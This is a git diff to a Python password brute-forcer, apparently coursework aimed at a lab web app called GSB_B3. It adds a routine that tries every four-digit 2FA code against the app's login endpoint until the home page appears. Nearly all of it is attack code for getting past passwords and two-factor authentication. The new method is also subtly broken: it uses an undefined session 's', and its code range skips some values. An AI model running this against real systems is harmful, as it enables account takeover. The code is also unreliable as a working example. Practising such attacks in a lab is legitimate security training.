@@ -1,6 +1,7 @@
 import requests
+from requests_html import HTMLSession
 import base64
-from queue import Queue
+#import time
 
 class Bruteforcer() :
     def __init__(self, wordlist, hostname, url, uri='/'):
@@ -40,7 +41,26 @@ class Bruteforcer() :
                         if 'code à 4 chiffres' in requeteHTTP.text :
                             print("\nMot de passe trouvé : " + passwd)
                             continuer = False
+                            self.bruteforce2FA()
                             break
+
+    def bruteforce2FA(self) :
+        for i in range(1000, 9999):
+            code = {
+                'code': i
+            }
+            # On teste le code
+            p = s.post('http://GSB_B3/index.php?uc=connexion&action=valideA2fConnexion', data=code)
+            # On essaye de récupérer la page d'accueil
+            r = s.get('http://GSB_B3/index.php', data=code)
+            elHTML = r.html.find('.glyphicon-home', first=True)
+            # Est-ce que l'on est connecté ?
+            if elHTML is not None:
+                print("Le code est : ",i)
+                # On s'arrête lorsque c'est trouvé !
+                break
+
+
     """
     # Essaie de créer un header HTTP pour une requête
     def getHeader(self):
@@ -88,5 +108,5 @@ class Bruteforcer() :
 
 
 
-brute = Bruteforcer('../resources/passwords.txt', 'cybergsb', 'http://cybergsb', '/index.php?uc=connexion&action=valideConnexion')
+brute = Bruteforcer('C:/Users/adrien.dodero/Desktop/Cours/Cyber/Lernaen-Hydra/resources/passwords.txt', 'GSB_B3', 'http://GSB_B3', '/index.php?uc=connexion&action=valideConnexion')
 brute.authenticate()
